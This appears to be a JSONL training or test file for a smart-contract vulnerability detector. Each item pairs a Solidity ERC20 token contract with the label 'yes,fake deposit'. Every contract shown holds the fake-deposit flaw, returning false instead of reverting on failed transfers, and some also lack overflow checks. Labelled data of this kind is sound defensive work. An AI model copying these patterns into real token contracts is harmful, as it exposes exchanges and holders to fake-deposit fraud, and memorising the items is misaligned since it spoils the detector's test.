{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Can Swap\";\n decimals = 0;\n symbol = \"CAN\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000; // Update total supply (100000 for example)\n name = \"Elonex\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"Elonex\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'McAfeeGhost' token contract\n//\n// Symbol : AGHOST \ud83d\udc7b\n// Name : McAfee Ghost\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract McAfeeGhost is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"McAfee Ghost\";\n string public constant symbol = \"AGHOST \ud83d\udc7b\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"Nude NFT\";\n decimals = 0;\n symbol = \"NUDE\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //uint256 _limit = .01*10000000000000000000;\n // && _value <= _limit\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract BitSound is StandardToken {\n\n function (){\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n function BitSound() {\n balances[msg.sender] = 3000000000000000000;\n totalSupply = 1500000000000000000;\n name = \"BitSound\";\n decimals = 10;\n symbol = \"NOISE\";\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SHIBA_INU_2 is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000*10**uint256(decimals);\n string public constant name = \"SHIBA INU 2\";\n string public constant symbol = \"SHIB2\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n \n function () external payable {\n teamAddress.transfer(msg.value);\n }\n\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n\n \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract JapaneseSpitz is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'Spitz.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function JapaneseSpitz() {\n balances[msg.sender] = 10000000000000000000000000000; \n totalSupply = 10000000000000000000000000000;\n name = \"Japanese Spitz\";\n decimals = 18; \n symbol = \"Spitz\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000; // Update total supply (100000 for example)\n name = \"FennyPenny\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals\n symbol = \"FP\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\n\ninterface ERC20Interface {\n \n function totalSupply() external view returns (uint256);\n\n \n function balanceOf(address account) external view returns (uint256);\n\n \n function transfer(address recipient, uint256 amount) external returns (bool);\n\n \n function allowance(address owner, address spender) external view returns (uint256);\n\n \n function approve(address spender, uint256 amount) external returns (bool);\n\n \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n \n event Transfer(address indexed from, address indexed to, uint256 value);\n\n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n // Empty internal constructor, to prevent people from mistakenly deploying\n // an instance of this contract, which should be used via inheritance.\n // constructor () internal { }\n // solhint-disable-previous-line no-empty-blocks\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract FaircoverCoin is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply * 10 ** uint256(decimals);\n _balances[msg.sender] = initialSupply * 10 ** uint256(decimals);\n }\n\n \n function name() public view returns (string memory) {\n return _name;\n }\n\n \n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n \n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract SpongebobSquarepantsToken is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Spongebob Squarepants Token\";\n string public constant symbol = \"SPONGE \ud83e\uddfd\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
